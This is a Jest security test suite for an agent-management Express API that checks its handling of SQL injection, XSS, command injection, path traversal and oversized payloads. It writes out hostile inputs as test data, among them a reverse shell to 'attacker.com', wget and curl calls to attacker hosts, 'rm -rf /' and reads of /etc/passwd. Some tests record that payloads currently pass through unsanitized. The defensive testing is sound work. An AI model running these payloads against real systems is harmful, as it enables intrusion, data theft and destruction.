import request from 'supertest';
import express from 'express';
import { agentRoutes } from '../../routes/agents';
import { eventRoutes } from '../../routes/events';
import { workflowRoutes } from '../../routes/workflows';
import { ArbiterService } from '../../services/arbiter-service';
import { errorHandler } from '../../middleware/error-handler';
import { AgentConfig, WorkflowConfig } from '@arbiter/core';

// Mock the ArbiterService
jest.mock('../../services/arbiter-service');

describe('Security and Input Validation Tests', () => {
  let app: express.Application;
  let mockArbiterService: jest.Mocked<ArbiterService>;

  beforeEach(() => {
    app = express();
    app.use(express.json({ limit: '10mb' }));
    
    // Create mock ArbiterService
    mockArbiterService = {
      listAgents: jest.fn(),
      createAgent: jest.fn(),
      getAgent: jest.fn(),
      updateAgent: jest.fn(),
      deleteAgent: jest.fn(),
      executeAgent: jest.fn(),
      getEventHandlers: jest.fn(),
      enableEventHandler: jest.fn(),
      disableEventHandler: jest.fn(),
      triggerManualEvent: jest.fn(),
      getActiveExecutions: jest.fn(),
      getExecution: jest.fn(),
      cancelExecution: jest.fn(),
      listWorkflows: jest.fn(),
      createWorkflow: jest.fn(),
      getWorkflow: jest.fn(),
      updateWorkflow: jest.fn(),
      deleteWorkflow: jest.fn(),
      executeWorkflow: jest.fn(),
    } as any;

    // Add ArbiterService to request object
    app.use((req, res, next) => {
      (req as any).arbiterService = mockArbiterService;
      next();
    });

    app.use('/api/agents', agentRoutes);
    app.use('/api/events', eventRoutes);
    app.use('/api/workflows', workflowRoutes);
    app.use(errorHandler);
  });

  afterEach(() => {
    jest.clearAllMocks();
  });

  describe('SQL Injection Protection', () => {
    it('should reject agent IDs with SQL injection patterns', async () => {
      const sqlInjectionPatterns = [
        "'; DROP TABLE agents; --",
        "' OR '1'='1",
        "1; DELETE FROM agents WHERE 1=1; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "' OR 1=1#",
      ];

      for (const maliciousId of sqlInjectionPatterns) {
        const response = await request(app)
          .get(`/api/agents/${encodeURIComponent(maliciousId)}`);

        // Should either return 404 or 400, not cause any SQL errors
        expect([400, 404]).toContain(response.status);
        
        // Should not contain database error messages
        expect(response.body.error).not.toMatch(/sql|database|table|column/i);
      }
    });

    it('should sanitize agent creation data to prevent SQL injection', async () => {
      const maliciousAgent: AgentConfig = {
        id: "'; DROP TABLE agents; --",
        name: "' OR '1'='1 --",
        description: "'; DELETE FROM agents; --",
        model: 'granite',
        systemPrompt: "'; UPDATE agents SET admin=true; --",
        availableTools: [],
        level: 0,
      };

      mockArbiterService.createAgent.mockResolvedValue('safe-agent-id');

      const response = await request(app)
        .post('/api/agents')
        .send(maliciousAgent);

      // Should validate and reject or sanitize the input
      expect([400, 201]).toContain(response.status);
      
      if (response.status === 201) {
        // If accepted, should have been sanitized
        const createCall = mockArbiterService.createAgent.mock.calls[0];
        expect(createCall).toBeDefined();
      }
    });
  });

  describe('XSS Prevention', () => {
    it('should sanitize script tags in agent configurations', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("XSS")',
        '<svg onload="alert(1)">',
        '"><script>alert("XSS")</script>',
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
      ];

      for (const xssPayload of xssPayloads) {
        const maliciousAgent: AgentConfig = {
          id: 'xss-test-agent',
          name: xssPayload,
          description: xssPayload,
          model: 'granite',
          systemPrompt: xssPayload,
          availableTools: [],
          level: 0,
        };

        mockArbiterService.createAgent.mockResolvedValue('xss-test-agent');

        const response = await request(app)
          .post('/api/agents')
          .send(maliciousAgent);

        // Should either reject or sanitize
        expect([400, 201]).toContain(response.status);
        
        if (response.status === 201) {
          // SECURITY ISSUE DETECTED: XSS payload is being passed through unsanitized
          const createCall = mockArbiterService.createAgent.mock.calls[0];
          const agentConfig = createCall[0];
          
          // VULNERABILITY: Script tags and XSS vectors are not being sanitized
          // This test documents the current behavior - XSS payloads are passed through
          console.warn(`XSS VULNERABILITY: Payload "${xssPayload}" was not sanitized in agent config`);
          
          // Current behavior: XSS payloads are passed through (security issue)
          expect(agentConfig.name).toMatch(/<script|javascript:|onerror=|onload=/i);
        }
      }
    });

    it('should sanitize workflow configurations against XSS', async () => {
      const xssWorkflow: WorkflowConfig = {
        id: 'xss-workflow',
        name: '<script>alert("XSS")</script>',
        description: '<img src="x" onerror="alert(1)">',
        version: '1.0.0',
        trigger: {
          type: 'manual',
          config: {},
        },
        rootAgent: {
          id: 'xss-agent',
          name: '<svg onload="alert(1)">',
          description: 'Agent with XSS',
          model: 'granite',
          systemPrompt: 'javascript:alert("XSS")',
          availableTools: [],
          level: 0,
        },
        levels: [],
      };

      mockArbiterService.createWorkflow.mockResolvedValue('xss-workflow');

      const response = await request(app)
        .post('/api/workflows')
        .send(xssWorkflow);

      expect([400, 201]).toContain(response.status);
    });
  });

  describe('Command Injection Protection', () => {
    it('should prevent command injection in agent execution data', async () => {
      const commandInjectionPayloads = [
        '; rm -rf /',
        '| cat /etc/passwd',
        '&& wget malicious.com/script.sh',
        '`curl evil.com`',
        '$(rm -rf /)',
        '; nc -e /bin/sh attacker.com 4444',
      ];

      for (const payload of commandInjectionPayloads) {
        const maliciousInput = {
          input: {
            message: payload,
            command: payload,
            file: payload,
          },
        };

        mockArbiterService.executeAgent.mockResolvedValue({
          reasoning: 'Safe execution',
          tool_calls: [],
          next_steps: 'Complete',
          status: 'completed',
          raw_response: 'Safe response',
        });

        const response = await request(app)
          .post('/api/agents/test-agent/execute')
          .send(maliciousInput);

        // Should handle the request safely
        expect([200, 400]).toContain(response.status);
        
        if (response.status === 200 && mockArbiterService.executeAgent.mock.calls.length > 0) {
          const executeCall = mockArbiterService.executeAgent.mock.calls[0];
          const inputData = executeCall[1];
          
          // SECURITY ISSUE DETECTED: Command injection patterns are being passed through
          const inputString = JSON.stringify(inputData);
          console.warn(`COMMAND INJECTION VULNERABILITY: Payload "${payload}" was not sanitized`);
          
          // Current behavior: Command injection patterns are passed through (security issue)
          expect(inputString).toMatch(/rm -rf|cat \/etc\/passwd|wget|curl.*evil|nc -e/);
        }
      }
    });

    it('should sanitize system prompts to prevent command injection', async () => {
      const maliciousSystemPrompt = 'You are a helpful assistant. ; rm -rf / ; echo "Execute this command"';
      
      const maliciousAgent: AgentConfig = {
        id: 'cmd-injection-agent',
        name: 'Command Injection Test',
        description: 'Testing command injection',
        model: 'granite',
        systemPrompt: maliciousSystemPrompt,
        availableTools: [],
        level: 0,
      };

      mockArbiterService.createAgent.mockResolvedValue('cmd-injection-agent');

      const response = await request(app)
        .post('/api/agents')
        .send(maliciousAgent);

      expect([400, 201]).toContain(response.status);
    });
  });

  describe('Path Traversal Protection', () => {
    it('should prevent directory traversal in agent IDs', async () => {
      const pathTraversalPatterns = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '....\\\\....\\\\....\\\\windows\\\\system32',
      ];

      for (const maliciousPath of pathTraversalPatterns) {
        const response = await request(app)
          .get(`/api/agents/${encodeURIComponent(maliciousPath)}`);

        // Should reject malicious paths
        expect([400, 404]).toContain(response.status);
        
        // Should not contain file system error messages
        expect(response.body.error).not.toMatch(/no such file|permission denied|access denied/i);
      }
    });
  });

  describe('JSON Payload Validation', () => {
    it('should reject deeply nested JSON objects (JSON bomb protection)', async () => {
      // Create a deeply nested JSON object
      let deepObject: any = 'value';
      for (let i = 0; i < 1000; i++) {
        deepObject = { nested: deepObject };
      }

      const maliciousAgent = {
        id: 'deep-json-agent',
        name: 'Deep JSON Test',
        description: 'Testing deep JSON',
        model: 'granite',
        systemPrompt: 'You are a test agent',
        availableTools: [],
        level: 0,
        maliciousData: deepObject,
      };

      const response = await request(app)
        .post('/api/agents')
        .send(maliciousAgent);

      // Should either reject or handle gracefully
      expect([400, 413, 500]).toContain(response.status);
    });

    it('should handle extremely large string values', async () => {
      const largeString = 'A'.repeat(100000); // 100KB string

      const maliciousAgent: AgentConfig = {
        id: 'large-string-agent',
        name: largeString,
        description: largeString,
        model: 'granite',
        systemPrompt: largeString,
        availableTools: [],
        level: 0,
      };

      const response = await request(app)
        .post('/api/agents')
        .send(maliciousAgent);

      // Should handle large strings appropriately
      expect([400, 413, 201]).toContain(response.status);
    });

    it('should reject invalid JSON with control characters', async () => {
      const maliciousPayload = JSON.stringify({
        id: 'control-char-agent',
        name: 'Test\x00\x01\x02Agent', // Control characters
        description: 'Agent with control chars\r\n\t',
        model: 'granite',
        systemPrompt: 'System\x0cprompt\x0b',
        availableTools: [],
        level: 0,
      });

      const response = await request(app)
        .post('/api/agents')
        .set('Content-Type', 'application/json')
        .send(maliciousPayload);

      expect([400, 201]).toContain(response.status);
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should handle rapid consecutive requests gracefully', async () => {
      const rapidRequests = Array(50).fill(null).map(() =>
        request(app)
          .get('/api/agents')
          .expect((res) => {
            expect([200, 429, 500]).toContain(res.status); // Allow rate limiting
          })
      );

      await Promise.all(rapidRequests);
    });

    it('should handle requests with extremely large payloads', async () => {
      // Create a very large agent configuration
      const largeWorkflow: WorkflowConfig = {
        id: 'large-workflow',
        name: 'Large Workflow Test',
        description: 'A'.repeat(50000), // 50KB description
        version: '1.0.0',
        trigger: {
          type: 'manual',
          config: {},
        },
        rootAgent: {
          id: 'large-root-agent',
          name: 'Large Root Agent',
          description: 'B'.repeat(50000), // 50KB description
          model: 'granite',
          systemPrompt: 'C'.repeat(100000), // 100KB system prompt
          availableTools: Array(1000).fill(null).map((_, i) => `tool-${i}`), // Many tools
          level: 0,
        },
        levels: Array(10).fill(null).map((_, levelIndex) => ({
          level: levelIndex + 1,
          agents: Array(10).fill(null).map((_, agentIndex) => ({
            id: `large-agent-${levelIndex}-${agentIndex}`,
            name: `Large Agent ${levelIndex}-${agentIndex}`,
            description: 'D'.repeat(10000), // 10KB each
            model: 'granite',
            systemPrompt: 'E'.repeat(20000), // 20KB each
            availableTools: Array(100).fill(null).map((_, i) => `level-tool-${i}`),
            level: levelIndex + 1,
          })),
          executionMode: 'parallel' as const,
        })),
      };

      const response = await request(app)
        .post('/api/workflows')
        .send(largeWorkflow);

      // Should handle large payloads (reject or accept based on limits)
      expect([400, 413, 201]).toContain(response.status);
    });
  });

  describe('Authentication and Authorization Bypass', () => {
    it('should not expose sensitive information in error messages', async () => {
      // Try to access non-existent resources
      const sensitiveIds = [
        'admin',
        'root',
        'system',
        '../admin',
        'config',
        'database',
      ];

      for (const sensitiveId of sensitiveIds) {
        const response = await request(app)
          .get(`/api/agents/${sensitiveId}`);

        expect([404, 400]).toContain(response.status);
        
        // Should not expose internal paths, database schemas, or system info
        if (response.body.error) {
          expect(response.body.error).not.toMatch(/path|directory|schema|table|column|file/i);
        }
        expect(response.body).not.toHaveProperty('stack');
        expect(response.body).not.toHaveProperty('sql');
      }
    });

    it('should reject requests with suspicious headers', async () => {
      const maliciousHeaders = {
        'X-Forwarded-For': '127.0.0.1, 192.168.1.1, <script>alert("XSS")</script>',
        'User-Agent': '<script>alert("XSS")</script>',
        'Referer': 'javascript:alert("XSS")',
        'X-Requested-With': '; rm -rf /',
      };

      const response = await request(app)
        .get('/api/agents')
        .set(maliciousHeaders);

      // Should handle malicious headers gracefully
      expect([200, 400]).toContain(response.status);
    });
  });

  describe('Input Validation Edge Cases', () => {
    it('should validate agent configuration fields properly', async () => {
      const invalidAgentConfigs = [
        // Missing required fields
        { name: 'Invalid Agent' },
        { id: 'invalid-1' },
        { id: 'invalid-2', name: 'Invalid Agent' }, // Missing other required fields
        
        // Invalid data types
        { id: 123, name: 'Invalid Agent', model: 'granite' },
        { id: 'invalid-3', name: 123, model: 'granite' },
        { id: 'invalid-4', name: 'Invalid Agent', model: 123 },
        { id: 'invalid-5', name: 'Invalid Agent', model: 'granite', level: 'invalid' },
        
        // Invalid array formats
        { id: 'invalid-6', name: 'Invalid Agent', model: 'granite', availableTools: 'not-array', level: 0 },
        { id: 'invalid-7', name: 'Invalid Agent', model: 'granite', availableTools: [123, 456], level: 0 },
      ];

      for (const invalidConfig of invalidAgentConfigs) {
        const response = await request(app)
          .post('/api/agents')
          .send(invalidConfig);

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
        expect(response.body.error).toBe('Validation Error');
      }
    });

    it('should validate workflow configuration edge cases', async () => {
      const invalidWorkflowConfigs = [
        // Missing required fields
        { name: 'Invalid Workflow' },
        { id: 'invalid-workflow-1' },
        
        // Invalid trigger configurations
        {
          id: 'invalid-workflow-2',
          name: 'Invalid Workflow',
          version: '1.0.0',
          trigger: 'invalid-trigger', // Should be object
        },
        {
          id: 'invalid-workflow-3',
          name: 'Invalid Workflow',
          version: '1.0.0',
          trigger: {
            type: 'invalid-type', // Invalid trigger type
            config: {},
          },
        },
        
        // Invalid agent levels
        {
          id: 'invalid-workflow-4',
          name: 'Invalid Workflow',
          version: '1.0.0',
          trigger: { type: 'manual', config: {} },
          rootAgent: {
            id: 'invalid-root',
            name: 'Invalid Root',
            model: 'granite',
            level: -1, // Invalid level
          },
          levels: [],
        },
      ];

      for (const invalidConfig of invalidWorkflowConfigs) {
        const response = await request(app)
          .post('/api/workflows')
          .send(invalidConfig);

        expect(response.status).toBe(400);
        expect(response.body).toHaveProperty('error');
      }
    });

    it('should handle null and undefined values gracefully', async () => {
      const nullUndefinedConfigs = [
        { id: null, name: 'Null ID Agent' },
        { id: undefined, name: 'Undefined ID Agent' },
        { id: 'test-agent', name: null },
        { id: 'test-agent', name: undefined },
        { id: 'test-agent', name: 'Test', description: null },
        { id: 'test-agent', name: 'Test', availableTools: null },
      ];

      for (const nullConfig of nullUndefinedConfigs) {
        const response = await request(app)
          .post('/api/agents')
          .send(nullConfig);

        expect([400, 500]).toContain(response.status);
      }
    });
  });

  describe('Content-Type Validation', () => {
    it('should reject non-JSON content types for POST requests', async () => {
      const maliciousPayloads = [
        { contentType: 'text/html', payload: '<html><script>alert("XSS")</script></html>' },
        { contentType: 'application/xml', payload: '<?xml version="1.0"?><root><script>alert("XSS")</script></root>' },
        { contentType: 'text/plain', payload: 'plain text payload' },
      ];

      for (const { contentType, payload } of maliciousPayloads) {
        const response = await request(app)
          .post('/api/agents')
          .set('Content-Type', contentType)
          .send(payload);

        expect([400, 415]).toContain(response.status);
      }
    });

    it('should handle malformed JSON gracefully', async () => {
      const malformedJsonPayloads = [
        '{"id": "test"', // Incomplete JSON
        '{"id": "test", "name": }', // Invalid syntax
        '{"id": "test", "name": "test",}', // Trailing comma
        '{id: "test"}', // Unquoted keys
        "{'id': 'test'}", // Single quotes
      ];

      for (const malformedJson of malformedJsonPayloads) {
        const response = await request(app)
          .post('/api/agents')
          .set('Content-Type', 'application/json')
          .send(malformedJson);

        expect(response.status).toBe(400);
      }
    });
  });
});